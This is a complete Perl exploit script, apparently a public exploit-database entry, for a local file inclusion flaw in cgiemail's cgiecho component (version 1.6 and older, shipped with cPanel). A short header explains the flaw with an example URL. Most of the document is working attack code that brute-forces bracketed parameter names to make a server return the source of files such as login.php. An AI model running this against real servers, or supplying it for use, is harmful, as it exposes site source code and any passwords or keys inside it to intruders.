#!/usr/bin/env perl
# Exploit Title:    cgiemail local file inclusion
# Vendor Homepage:  http://web.mit.edu/wwwdev/cgiemail/webmaster.html
# Software Link:    http://web.mit.edu/wwwdev/cgiemail/cgiemail-1.6.tar.gz
# Version:          1.6 and older
# Date:             2016-09-27

# cgiecho a script included with cgiemail will return any file under a 
# websites document root if the file contains square brackets and the text
# within the brackets is guessable.

# cgiemail is currently shipped with cPanel and is enabled by default.

# Example: http://hostname/cgi-sys/cgiecho/login.php?'pass'=['pass'] 
#          will display http://hostname/login.php if login.php contains $_POST['pass']




##
# cgiemail local file inclusion exploit
# Author: Finbar Crago <finbar.crago@gmail.com>
# https://github.com/finbar-crago/cgiemail-exploit
##
use strict;
use warnings;
use POSIX;
use LWP::UserAgent;
use HTML::Entities;
use Getopt::Long;
$|++; $\="\n"; $,=" ";

sub usage {
die <<"EOF";

cgiemail local file inclusion exploit

Usage: $0 [options] target

Options:
  --names         Check for names in commer separated list
  --num           Check for numbers
  --num-max       Maximum number to check (default 10)
  --batch         Number of arguments sent per request (default 10)
  --cgiecho-path  Path of cgiecho on server (default '/cgi-sys/cgiecho/')
  --user-agent    Set user-agent (default 'Mozilla/5.0')
  --deley         Pause between requests in seconds (default 1)
  --timeout       Set connection timeout (default 10)

Example:
  $0 --num --names 'email,password' http://hostname/login.php > login.php

EOF
}

my $names;
my $num = 0;
my $num_max = 10; 
my $batch = 10;
my $cgiecho_path = '/cgi-sys/cgiecho';
my $user_agent = 'Mozilla/5.0';
my $timeout = 10;
my $deley = 1;
GetOptions(
    'names=s'      => \$names,
    'num'          => \$num,
    'num-max=i'    => \$num_max,
    'batch=i'      => \$batch,

    'cgiecho-path' => \$cgiecho_path,
    'user-agent=s' => \$user_agent,
    'deley=i'      => \$deley,
    'timeout=i'    => \$timeout,
);

usage unless
    defined $ARGV[0] &&
    $ARGV[0] =~ m|^(https?://)?([a-z\d.-]+)/?(.*)?|i;

my $conn=$1||'http://';my $host=$2;my $path=$3||'index.php';
my $url = "$conn$host/$cgiecho_path/$path";
my @list= ();

if($num){ push @list, $_ for 0..$num_max }
if($names){
    push @list, "%22$_%22","%27$_%27" for split/,/,$names;
}


my $ua = LWP::UserAgent->new;
$ua->agent($user_agent);
$ua->timeout($timeout);

$batch--;
my $i=0;
my $end = ceil($#list/$batch);
while($#list+1){
    my $args='?';
    my $to = ($#list > $batch)?$batch:$#list;
    $args.="$_=[$_]&" for @list[0..$to];
    @list = @list[$to+1..$#list];

    my $res = $ua->get($url.$args);
    die $res->status_line if !$res->content_is_html;
    my $html = $res->decoded_content;
    if($html !~ />cgiemail[\n\r ]*([\d.]+)/){
	print "cgiemail not found"  if !$i;
	print "cgiemail was here but now it's not..." if $i;
	exit -1;
    } print STDERR "detected cgiemail $1" if !$i;

    print STDERR "\e[Jrequest ".++$i." of $end...";

    if($res->code == 200){
	$html =~ m|<PRE>(.+)</PRE>|s;
	print decode_entities($1);
	print STDERR "success!";
	exit;
    }

    if($res->code == 500){
	if($html =~ m|500 Could not open template - No such file or directory|){
	    print STDERR "the file /$path doesn't exist...";
	} 
	elsif($html =~ m|500 Empty template file|){
	    print STDERR "/$path is a directory...";
	}
	else{
	    print STDERR "unknown 500 error:";
	    print STDERR $html;
	}
	exit -1;
    }

    select(undef,undef,undef,$deley); printf "\eM";
}
print STDERR "sorry, no match found for $path";
exit -1;
